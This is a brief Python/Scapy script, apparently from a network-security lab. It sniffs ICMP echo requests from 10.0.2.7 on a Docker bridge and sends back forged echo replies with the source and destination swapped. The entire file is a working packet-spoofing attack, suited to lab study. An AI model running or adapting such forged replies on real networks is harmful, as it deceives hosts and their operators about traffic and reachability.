#!usr/bin/python3
from scapy.all import *

def spoofing(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:      #is a request
        print('********** BEFORE SPOOFING **********')
        print(' >> IP SRC: ', pkt[IP].src)
        print(' >> IP DST: ', pkt[IP].dst)
        
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load
        spoofed_pkt = ip/icmp/data
        
        print('********** AFTER SPOOFING **********')
        print(' >> IP SRC: ', spoofed_pkt[IP].src)
        print(' >> IP DST: ', spoofed_pkt[IP].dst)
        print("\n")
        send(spoofed_pkt, verbose=0)

pkt = sniff(iface=['br-6a709a0e8789', 'enp0s3'],filter='icmp and src host 10.0.2.7', prn=spoofing)
